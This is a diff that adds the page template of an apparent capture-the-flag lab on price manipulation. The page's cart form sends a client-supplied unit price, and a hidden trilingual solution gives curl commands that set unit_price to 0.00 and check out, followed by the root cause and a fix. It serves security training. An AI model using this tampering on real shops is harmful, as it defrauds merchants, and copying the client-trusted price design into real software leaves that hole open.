@@ -1,0 +1,204 @@
+{% extends "base.html" %}
+{% block title %}V28 – Business Logic: Price Manipulation – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4 border-l-4" style="border-left-color:#ef4444">
+    <h3 class="font-semibold text-sm mb-2" data-i18n="obj_title">Objetivo</h3>
+    <div class="lang-content text-sm text-gray-400" data-lang="es">Compra gratis el HSM empresarial manipulando el contrato HTTP entre el frontend, la API de carrito y el checkout.</div>
+    <div class="lang-content text-sm text-gray-400" data-lang="en" style="display:none">Buy the enterprise HSM for free by tampering with the HTTP contract between the frontend, cart API, and checkout.</div>
+    <p class="text-xs font-mono mt-2"><span data-i18n="obj_flag_lbl">Flag:</span> <code>HL{···}</code> <span data-i18n="obj_flag_hint">— valídala en la barra lateral.</span></p>
+  </div>
+
+  {% if flag %}<div class="hl-card mb-4 text-green-400 font-mono">{{ flag }}</div>{% endif %}
+
+  <div class="hl-card mb-4">
+    <div class="flex justify-between gap-4">
+      <div>
+        <div class="text-xs text-gray-500 font-mono">SKU {{ product.id }}</div>
+        <h2 class="font-semibold text-lg mt-1">{{ product.name }}</h2>
+        <p class="lang-content text-xs text-gray-500 mt-1" data-lang="es">Módulo de seguridad hardware con soporte empresarial</p>
+        <p class="lang-content text-xs text-gray-500 mt-1" data-lang="en" style="display:none">Hardware security module with enterprise support</p>
+      </div>
+      <div class="text-xl font-bold font-mono" style="color:var(--hl-primary)">${{ '%.2f'|format(product.price_cents / 100) }}</div>
+    </div>
+    <form id="price-add-form" class="mt-4" method="POST" action="/price-manipulation/api/cart/items">
+      <input type="hidden" name="product_id" value="{{ product.id }}">
+      <input type="hidden" name="unit_price" value="{{ '%.2f'|format(product.price_cents / 100) }}">
+      <input type="hidden" name="quantity" value="1">
+      <button class="btn-primary" type="submit" data-i18n="price_add_cart">Añadir al carrito</button>
+    </form>
+  </div>
+
+  <div class="hl-card mb-4">
+    <div class="flex justify-between items-center mb-3">
+      <h2 class="font-semibold text-sm" data-i18n="price_server_cart">Carrito del servidor</h2>
+      <span class="text-xs font-mono"><span data-i18n="price_balance">Saldo:</span> $5.00</span>
+    </div>
+    <div id="price-cart-lines">
+      {% for item in cart %}
+      {% include 'labs/_price_cart_line.html' %}
+      {% endfor %}
+    </div>
+    <p id="price-empty-cart" class="text-xs text-gray-500 italic{% if cart %} hidden{% endif %}" data-i18n="price_empty_cart">El carrito está vacío.</p>
+    <div id="price-cart-summary"{% if not cart %} class="hidden"{% endif %}>
+      <div class="flex justify-between font-semibold mt-3"><span>Total</span><span id="price-cart-total">${{ '%.2f'|format(total_cents / 100) }}</span></div>
+      <button id="price-checkout" class="btn-primary mt-4" type="button" data-i18n="price_checkout">Finalizar compra</button>
+    </div>
+    <div id="price-checkout-feedback" class="hidden mt-4 rounded-lg border p-3 text-sm">
+      <div id="price-checkout-message" class="font-semibold" data-i18n="price_purchase_success">¡Compra realizada correctamente!</div>
+      <div id="price-checkout-flag" class="mt-1 font-mono"></div>
+    </div>
+    <pre id="price-api-result" class="mt-3 text-xs font-mono whitespace-pre-wrap"></pre>
+  </div>
+
+  <form method="POST" action="/price-manipulation/reset"><button type="submit" class="text-xs text-gray-500 hover:text-red-400" data-i18n="price_clear_cart">Vaciar carrito</button></form>
+</div>
+
+<script>
+function priceSetCartState(total) {
+  const hasItems = document.querySelectorAll('.price-cart-line').length > 0;
+  document.getElementById('price-empty-cart').classList.toggle('hidden', hasItems);
+  document.getElementById('price-cart-summary').classList.toggle('hidden', !hasItems);
+  document.getElementById('price-cart-total').textContent = `$${total}`;
+}
+
+function priceAppendCartLine(itemHtml, total) {
+  document.getElementById('price-cart-lines').insertAdjacentHTML('beforeend', itemHtml);
+  priceSetCartState(total);
+  if (typeof applyTranslations === 'function') applyTranslations();
+}
+
+document.getElementById('price-add-form')?.addEventListener('submit', async (event) => {
+  event.preventDefault();
+  const form = event.currentTarget;
+  const body = Object.fromEntries(new FormData(form).entries());
+  body.quantity = Number(body.quantity);
+  const response = await fetch(form.action, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(body),
+  });
+  const data = await response.json();
+  const result = document.getElementById('price-api-result');
+  if (response.ok) {
+    result.textContent = '';
+    priceAppendCartLine(data.item_html, data.cart_total);
+  } else {
+    result.textContent = JSON.stringify(data, null, 2);
+  }
+});
+
+document.getElementById('price-checkout')?.addEventListener('click', async () => {
+  const response = await fetch('/price-manipulation/api/checkout', {method: 'POST'});
+  const data = await response.json();
+  const result = document.getElementById('price-api-result');
+  const feedback = document.getElementById('price-checkout-feedback');
+  const message = document.getElementById('price-checkout-message');
+  const feedbackFlag = document.getElementById('price-checkout-flag');
+  const currentLang = localStorage.getItem('hl_lang') || 'es';
+  result.textContent = '';
+  if (response.ok) {
+    feedback.className = 'mt-4 rounded-lg border border-green-500/40 bg-green-500/10 p-3 text-sm text-green-400';
+    message.textContent = currentLang === 'en'
+      ? 'Purchase completed successfully!'
+      : (currentLang === 'pt' ? 'Compra realizada com sucesso!' : '¡Compra realizada correctamente!');
+    feedbackFlag.textContent = data.flag || '';
+    document.getElementById('price-cart-lines').replaceChildren();
+    priceSetCartState(data.charged || '0.00');
+  } else {
+    feedback.className = 'mt-4 rounded-lg border border-red-500/40 bg-red-500/10 p-3 text-sm text-red-400';
+    if (data.error === 'insufficient_balance') {
+      message.textContent = currentLang === 'en'
+        ? 'Insufficient balance.'
+        : (currentLang === 'pt' ? 'Saldo insuficiente.' : 'Saldo insuficiente.');
+    } else {
+      message.textContent = currentLang === 'en'
+        ? 'Checkout could not be completed.'
+        : (currentLang === 'pt' ? 'Não foi possível concluir a compra.' : 'No se pudo completar la compra.');
+    }
+    feedbackFlag.textContent = '';
+  }
+  feedback.classList.remove('hidden');
+});
+document.getElementById('price-cart-lines').addEventListener('click', async (event) => {
+  const button = event.target.closest('.price-remove-item');
+  if (button) {
+    const response = await fetch(`/price-manipulation/api/cart/items/${encodeURIComponent(button.dataset.lineId)}`, {method: 'DELETE'});
+    const data = await response.json();
+    const result = document.getElementById('price-api-result');
+    if (response.ok) {
+      result.textContent = '';
+      button.closest('.price-cart-line').remove();
+      priceSetCartState(data.cart_total);
+    } else {
+      result.textContent = JSON.stringify(data, null, 2);
+    }
+  }
+});
+</script>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Explotación</h3>
+    <ol>
+      <li>Abre DevTools o intercepta <code>POST /price-manipulation/api/cart/items</code> con Burp.</li>
+      <li>El body contiene <code>product_id</code>, <code>quantity</code> y <code>unit_price</code>. Modifica únicamente <code>unit_price</code> a <code>0.00</code>.</li>
+      <li>Si añades una línea incorrecta, usa <strong>Eliminar</strong> junto al artículo. La API también permite borrarla mediante su <code>line_id</code>.</li>
+      <li>El carrito del servidor mostrará total $0.00. Ejecuta el checkout sin volver a añadir el producto.</li>
+      <li>El checkout muestra «¡Compra realizada correctamente!» y debajo la flag <code>HL{···}</code>.</li>
+    </ol>
+    <pre>curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'
+
+curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'</pre>
+    <h3>Eliminar una línea del carrito</h3>
+    <pre>LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
+curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"</pre>
+    <h3>Causa raíz</h3><p>El backend persiste el precio enviado por el cliente. El checkout recalcula desde un carrito del servidor, pero ese carrito ya contiene datos manipulados; «server-side» no equivale a «confiable».</p>
+    <h3>Mitigación</h3><pre># Aceptar solo product_id y quantity
+unit_price = catalog.get(product_id).price
+# Reconsultar precio, stock, impuestos y descuentos en checkout</pre>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation</h3>
+    <ol>
+      <li>Open DevTools or intercept <code>POST /price-manipulation/api/cart/items</code> with Burp.</li>
+      <li>The request body contains <code>product_id</code>, <code>quantity</code>, and <code>unit_price</code>. Change only <code>unit_price</code> to <code>0.00</code>.</li>
+      <li>If you add the wrong line, use <strong>Remove</strong> next to that item. The API can also delete it by its <code>line_id</code>.</li>
+      <li>The server cart now totals $0.00. Check out without adding the product again.</li>
+      <li>Checkout displays “Purchase completed successfully!” and the flag <code>HL{···}</code> underneath.</li>
+    </ol>
+    <pre>curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'
+
+curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'</pre>
+    <h3>Remove one cart line</h3>
+    <pre>LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
+curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"</pre>
+    <h3>Root cause</h3><p>The backend persists a client-supplied price. Checkout recomputes from a server-side cart, but the cart already contains tainted data; server-side does not automatically mean trusted.</p>
+    <h3>Mitigation</h3><pre># Accept product_id and quantity only
+unit_price = catalog.get(product_id).price
+# Reload price, stock, tax and discounts at checkout</pre>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Exploração</h3>
+    <ol>
+      <li>Abra o DevTools ou intercepte <code>POST /price-manipulation/api/cart/items</code> com o Burp.</li>
+      <li>O corpo da requisição contém <code>product_id</code>, <code>quantity</code> e <code>unit_price</code>. Modifique unicamente <code>unit_price</code> para <code>0.00</code>.</li>
+      <li>Se você adicionar um item incorreto, use <strong>Remover</strong> ao lado do artigo. A API também permite apagá-lo através do seu <code>line_id</code>.</li>
+      <li>O carrinho no servidor exibirá total de $0.00. Execute o checkout sem adicionar o produto novamente.</li>
+      <li>O checkout exibe «Compra realizada com sucesso!» e abaixo a flag <code>HL{···}</code>.</li>
+    </ol>
+    <pre>curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'
+
+curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'</pre>
+    <h3>Remover uma linha do carrinho</h3>
+    <pre>LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
+curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"</pre>
+    <h3>Causa raiz</h3><p>O backend persiste o preço enviado pelo cliente. O checkout recalcula a partir de um carrinho do lado do servidor, mas esse carrinho já contém dados manipulados; «server-side» não equivale a «confiável».</p>
+    <h3>Mitigação</h3><pre># Aceitar apenas product_id e quantity
+unit_price = catalog.get(product_id).price
+# Reconsultar preço, estoque, impostos e descontos no checkout</pre>
+  </div>
+</div>
+{% endblock %}
